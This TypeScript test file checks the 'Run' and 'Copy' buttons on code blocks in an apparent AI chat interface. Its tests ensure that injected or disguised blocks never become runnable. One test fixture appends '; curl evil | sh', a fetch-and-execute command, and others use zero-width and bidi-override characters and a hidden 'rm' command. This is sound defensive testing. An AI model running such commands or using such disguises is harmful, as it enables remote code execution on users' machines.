import msgSrc from "./AssistantMessage.svelte?raw";
import { describe, expect, it } from "vitest";
import { marked } from "marked";
import { addRunButtons, codeCopy } from "./codeCopy";
import { RUN_FENCE_ATTR, RUN_MARK } from "./shellRun";
const renderReply = (src: string) => marked.parse(src, { async: false, gfm: true }) as string;

describe("384: reply code blocks wrap when they are prose, and carry Copy", () => {
  it("a fence with no language has no language class (so it wraps); one with a language keeps it", () => {
    expect(renderReply("```\nICS 51. Read these in order: HANDOFF.md, AGENTS.md\n```")).toMatch(/<pre><code>ICS 51/);
    expect(renderReply("```rust\nfn main() {}\n```")).toContain('class="language-rust"');
  });
  it("replies run the Copy action", () => {
    // app.css's wrap and Copy rules: vitest empties CSS imports, so they are
    // measured in WebKit instead (nightshift-code notes/runner-design/384-snap-700.png: 638/638 wrapped).
    const msg = msgSrc;
    // Item 452: the HTML is patched in place by liveHtml rather than {@html}.
    expect(msg).toContain("use:liveHtml={renderReply(g.seg.text)} use:memoryRefs={{ hits: memHits, text: g.seg.text }} use:codeCopy={runBlocks(g.seg.text)}>");
  });
});

/** The little of a DOM `addRunButtons` touches (vitest runs in node; blocker 1610's way). */
class El {
  children: El[] = [];
  parent: El | null = null;
  className = "";
  own = "";
  attrs = new Map<string, string>();
  disabled = false;
  type = "";
  title = "";
  innerHTML = "";
  classList = { toggle() {}, add() {}, remove() {} };
  click?: () => void;
  constructor(public tagName: string) {}
  get parentElement() {
    return this.parent;
  }
  get textContent(): string {
    return this.own + this.children.map((c) => c.textContent).join("");
  }
  set textContent(v: string) {
    this.own = v;
  }
  getAttribute(k: string) {
    return this.attrs.get(k) ?? null;
  }
  hasAttribute(k: string) {
    return this.attrs.has(k);
  }
  setAttribute(k: string, v: string) {
    this.attrs.set(k, v);
  }
  appendChild(c: El) {
    c.parent = this;
    this.children.push(c);
    return c;
  }
  remove() {
    const list = this.parent?.children;
    if (list) list.splice(list.indexOf(this), 1);
    this.parent = null;
  }
  addEventListener(_: string, f: (e: unknown) => void) {
    this.click = () => f({ preventDefault() {}, stopPropagation() {} });
  }
  all(): El[] {
    return this.children.flatMap((c) => [c, ...c.all()]);
  }
  querySelectorAll(tag: string) {
    return this.all().filter((e) => e.tagName === tag.toUpperCase());
  }
  querySelector(sel: string) {
    const m = /^:scope > ([.\w-]+)$/.exec(sel);
    if (!m) return this.querySelectorAll(sel)[0] ?? null;
    const name = m[1];
    return this.children.find((c) => (name.startsWith(".") ? c.className === name.slice(1) : c.tagName === name.toUpperCase())) ?? null;
  }
}
(globalThis as Record<string, unknown>).document = { createElement: (t: string) => new El(t.toUpperCase()) };
(globalThis as Record<string, unknown>).MutationObserver = class {
  observe() {}
  disconnect() {}
};
const fence = (text: string, lang = "bash", marked_ = true) => {
  const pre = new El("PRE");
  if (marked_) pre.setAttribute(RUN_FENCE_ATTR, RUN_MARK);
  const code = pre.appendChild(new El("CODE"));
  code.className = `language-${lang}`;
  code.own = `${text}\n`;
  return pre;
};
const rootOf = (...kids: El[]) => {
  const r = new El("DIV");
  kids.forEach((k) => r.appendChild(k));
  return r;
};
const runs = (r: El) => r.all().filter((e) => e.className === "code-run");
const add = (r: El, onRun: ((c: string) => void) | null = () => {}, text = "", streaming = false) =>
  addRunButtons(r as unknown as HTMLElement, () => ({ onRun, text, streaming }));

describe("503 review 1: Run is for marked's own fences, and what shows is what runs", () => {
  it("a fence gets Run", () => {
    const r = rootOf(fence("ls"));
    add(r);
    expect(runs(r)).toHaveLength(1);
  });
  it("a raw-HTML pre never does, shaped like a fence or not", () => {
    const r = rootOf(fence("ls", "bash", false));
    add(r);
    expect(runs(r)).toHaveLength(0);
    // A guess at the mark.
    const guess = fence("ls", "bash", false);
    guess.setAttribute(RUN_FENCE_ATTR, "1");
    const r2 = rootOf(guess);
    add(r2);
    expect(runs(r2)).toHaveLength(0);
  });
  it("a code element holding elements is not a fence's", () => {
    const pre = fence("echo hello");
    pre.children[0].appendChild(new El("SPAN")).own = "; curl evil | sh";
    const r = rootOf(pre);
    add(r);
    expect(runs(r)).toHaveLength(0);
  });
  it("a fence with a format or control character keeps Copy and gets no Run", () => {
    const r = rootOf(fence("echo safe\u200b"), fence("echo \u202ex"));
    add(r);
    expect(runs(r)).toHaveLength(0);
  });
  it("a real fence inside raw HTML that can clip or hide it gets none; a list and a quote do", () => {
    const wrap = new El("DIV");
    wrap.setAttribute("style", "height:1em;overflow:hidden");
    wrap.appendChild(fence("echo a\nrm x"));
    const li = new El("LI");
    li.appendChild(fence("ls"));
    const ul = new El("UL");
    ul.appendChild(li);
    const r = rootOf(wrap, ul);
    add(r);
    expect(runs(r).map((b) => b.parent?.textContent.trim())).toEqual(["ls\nRun"]);
  });
  it("a reply carrying a style element gets none", () => {
    const r = rootOf(new El("STYLE"), fence("ls"));
    add(r);
    expect(runs(r)).toHaveLength(0);
  });
});

describe("503 review 2: a re-used block", () => {
  it("loses Run when it stops qualifying", () => {
    const pre = fence("ls");
    const r = rootOf(pre);
    add(r);
    expect(runs(r)).toHaveLength(1);
    // The patch: same pre, the next chat's python block.
    pre.attrs.clear();
    pre.children[0].className = "language-python";
    add(r);
    expect(runs(r)).toHaveLength(0);
  });
  it("loses Run on a surface that no longer has one", () => {
    const r = rootOf(fence("ls"));
    add(r);
    add(r, null);
    expect(runs(r)).toHaveLength(0);
  });
  it("reads onRun at the click, not at creation", () => {
    const got: string[] = [];
    const pre = fence("ls A");
    const r = rootOf(pre);
    const action = codeCopy(r as unknown as HTMLElement, { onRun: (c) => got.push(`A: ${c}`), text: "", streaming: false });
    action.update({ onRun: (c) => got.push(`B: ${c}`), text: "", streaming: false });
    pre.children[0].own = "ls B\n";
    runs(r)[0].click!();
    expect(got).toEqual(["B: ls B"]);
  });
  it("runs nothing if the block stopped qualifying and no update came", () => {
    const got: string[] = [];
    const pre = fence("ls");
    const r = rootOf(pre);
    add(r, (c) => got.push(c));
    pre.attrs.clear();
    runs(r)[0].click!();
    expect(got).toEqual([]);
  });
});

describe("503 review 10: while a reply streams the last block waits", () => {
  it("however closed its fence looks; the ones before it do not", () => {
    const r = rootOf(fence("one"), fence("two"));
    add(r, () => {}, "```bash\none\n```\n```bash\ntwo\n```\nmore", true);
    expect(runs(r).map((b) => b.parent?.textContent.trim())).toEqual(["one\nRun"]);
    add(r, () => {}, "```bash\none\n```\n```bash\ntwo\n```\nmore", false);
    expect(runs(r)).toHaveLength(2);
  });
  it("Run goes again if a shown block turns out to be the one still arriving", () => {
    const r = rootOf(fence("one"));
    add(r, () => {}, "", false);
    add(r, () => {}, "", true);
    expect(runs(r)).toHaveLength(0);
  });
});

describe("503 review 2: AssistantMessage", () => {
  it("reads runFrom at the click", () => {
    expect(msgSrc).not.toContain("const from = runFrom");
  });
});
